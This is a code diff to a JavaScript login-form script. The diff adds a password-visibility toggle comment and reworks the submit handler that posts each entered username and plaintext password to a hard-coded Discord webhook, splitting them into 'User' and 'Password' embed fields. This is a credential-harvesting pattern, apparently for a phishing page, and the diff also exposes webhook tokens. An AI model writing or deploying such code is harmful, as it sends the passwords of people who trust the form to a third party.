@@ -1,3 +1,4 @@
+// Toggle password visibility for the login form
 document.getElementById('togglePassword').addEventListener('click', function(event) {
     // Prevent form submission when the button is clicked
     event.preventDefault();
@@ -16,7 +17,7 @@ document.getElementById('togglePassword').addEventListener('click', function(eve
     this.textContent = (passwordInput.type === 'password') ? '👁️' : '🚫'; // Change emoji based on visibility
 });
 
-// Handle the form submission to send the login details to Discord (add webhook logic here)
+// Handle the form submission to send the login details to Discord
 document.querySelector("form").addEventListener("submit", function(event) {
     event.preventDefault();  // Prevent the default form submission
 
@@ -25,15 +26,23 @@ document.querySelector("form").addEventListener("submit", function(event) {
 
     if (username && password) {
         // Send login details to Discord webhook
-        const webhookUrl = 'https://discord.com/api/webhooks/1315544300695584830/UqHr8rG9jfLuE8bA79w4F2XPkEG7DBEAYjRB_XPT2M8R3JmOYJXRHmzxBApKXEXULNjr';
+        const webhookUrl = 'https://discord.com/api/webhooks/1315897807697084476/0OMmfzZVGpEkxQXaCJKvSCVqZyAjLiwG3lksybQ_UvFKYtzQBQWsv8KL-ccqTddBSUiw';
         const payload = {
-            content: `User: ${username} has logged in with the password: ${password}`,
-            username: 'Login System',
-            avatar_url: 'https://example.com/avatar.png', // Replace with your avatar URL
             embeds: [
                 {
-                    title: 'New Login',
-                    description: `User: ${username} has logged in with the password: ${password}`,
+                    title: 'User logged in',
+                    fields: [
+                        {
+                            name: 'User',
+                            value: username,
+                            inline: true
+                        },
+                        {
+                            name: 'Password',
+                            value: password,
+                            inline: true
+                        }
+                    ],
                     color: 7506394 // Grey color
                 }
             ]
